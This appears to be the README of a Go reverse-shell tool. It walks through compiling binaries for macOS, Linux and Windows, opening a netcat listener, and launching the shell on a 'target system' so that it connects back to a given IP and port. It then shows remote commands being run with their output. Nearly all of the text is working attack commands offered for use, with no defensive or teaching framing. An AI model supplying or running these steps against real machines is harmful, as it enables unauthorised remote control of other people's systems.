# go-reverse-shell


## Usage


1. Compile the reverse shell:
```bash
make all
```

2. Get the compiled binary for the target system from artifcats directory:
```bash
$ tree
.
├──reverse-shell-darwin
├──reverse-shell-linux
└──reverse-shell-windows.exe
```

3. Start a listener on:

```bash
$ nc -nlvp 5000
```

4. Start reverse shell on target system:

```bash
$ ./reverse-shell -ip 10.93.10.17 -port 5000
```

This will establish a tcp connection between the listening machine and the target machine. 
If the connection was established successfully you can send arbitrary commands from the listening machine.

```bash
$ nc -nlvp 5000
ls -la
total 0
drwxr-xr-x  4 marco  staff  128 Sep 27 19:13 .
drwxr-xr-x  6 marco  staff  192 Sep 27 19:12 ..
-rw-r--r--  1 marco  staff    0 Sep 27 19:13 file1.txt
-rw-r--r--  1 marco  staff    0 Sep 27 19:13 file2.txt
```
